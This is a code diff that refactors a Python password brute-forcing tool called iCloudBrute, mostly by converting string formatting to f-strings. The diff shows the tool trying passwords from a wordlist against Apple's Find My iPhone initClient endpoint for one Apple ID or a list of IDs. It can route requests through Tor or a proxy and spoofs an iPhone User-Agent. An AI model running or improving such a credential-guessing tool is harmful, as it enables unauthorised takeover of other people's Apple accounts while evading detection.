@@ -44,8 +44,10 @@ class iCloudBrute(object):
     
     def main(self):
         self.banner()
-        tor = False;apple_id=None
-        proxy = None;idw=None
+        tor = False
+        apple_id=None
+        proxy = None
+        idw=None
         if len(sys.argv) < 4:
             self.usage()
         try:
@@ -62,10 +64,10 @@ class iCloudBrute(object):
         if apple_id and wordlist:
             for p in self.readfile(wordlist):
                 p = p.decode('utf-8')
-                print("[ * ] Trying with password: %s"%p)
+                print(f"[ * ] Trying with password: {p}")
                 r = self.check(apple_id,p,proxy,tor)
                 if r is True:
-                    print('[ + ] Password found: %s'%p)
+                    print(f'[ + ] Password found: {p}')
                     break
                 elif r is None:
                     print('[ ! ] Blocked!!!')
@@ -74,10 +76,10 @@ class iCloudBrute(object):
                 for p in self.readfile(wordlist):
                     p = p.decode('utf-8')
                     i = i.decode('utf-8')
-                    print("[ * ] Trying Password: %s - ID: %s"%(p,i))
+                    print(f"[ * ] Trying Password: {p} - ID: {i}")
                     r = self.check(i,p,proxy,tor)
                     if r is True:
-                        print('[ + ] Found Password: %s for ID: %s'%(p,i))
+                        print(f'[ + ] Found Password: {p} for ID: {i}')
                         break
                     elif r is None: 
                         print('[ ! ] Blocked!!!')
@@ -86,8 +88,8 @@ class iCloudBrute(object):
     def check(self,apple_id,passwd,proxy,tor):
         proxies = {}
         if tor is True: proxies = {'http':self.tor,'https':self.tor}
-        if proxy != ('' or None): proxies = {'http':proxy,'https':proxy} 
-        url = ('https://fmipmobile.icloud.com/fmipservice/device/%s/initClient'%apple_id)
+        if proxy != ('' or None): proxies = {'http':proxy,'https':proxy}
+        url = f'https://fmipmobile.icloud.com/fmipservice/device/{apple_id}/initClient'
         headers = {
             'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_2 like Mac OS X)'
         }
